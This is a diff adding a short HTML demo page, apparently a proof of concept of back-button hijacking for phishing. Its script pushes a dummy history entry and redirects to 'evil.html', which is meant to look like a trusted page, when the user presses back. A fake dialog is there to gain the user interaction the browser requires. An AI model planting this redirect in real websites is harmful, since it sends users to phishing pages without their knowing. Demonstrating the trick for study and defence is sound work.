@@ -1,0 +1,48 @@
+<html>
+<body>
+<div><img src='2-2.png' /></div>
+<ul>
+<li>After click, "history.pushStat" API is called.</li>
+<li>Of course, you can't find the information you want.<br />(Because this is a part of trick for phishing.)</li>
+<li>Then, you use back button to go backward page.</li>
+</ul>
+<style type='text/css'>
+#gray {
+	position: absolute;
+	left: 0px;
+	top: 0px;
+	width: 100%;
+	height: 100%;
+	background-color: gray;
+	opacity: 0.5;
+}
+#dialog {
+	position: absolute;
+	left: 10px;
+	top: 10px;
+	padding: 1em;
+	background-color: white;
+	border: 1px solid  black;
+	border-radius: 5px;
+	text-align: center;
+}
+#dialog button {
+	margin-top: 1em;
+}
+</style>
+<div id='outer'>
+<div id='gray'></div>
+<div id='dialog'>This dialog is to get user interaction.<br / >Chrome needs user interaction for this trick.<br /><button>close</button></div>
+</div>
+</body>
+<script>
+history.pushState({}, '', '#dummy');
+window.onpopstate = (e) => {
+	// history back ---> evil.html (looks like trust.html)
+	location.href = 'evil.html';
+}
+document.getElementsByTagName('BUTTON').item(0).addEventListener('click', (e) => {
+	document.getElementById('outer').style.visibility = 'hidden';
+});
+</script>
+</html>
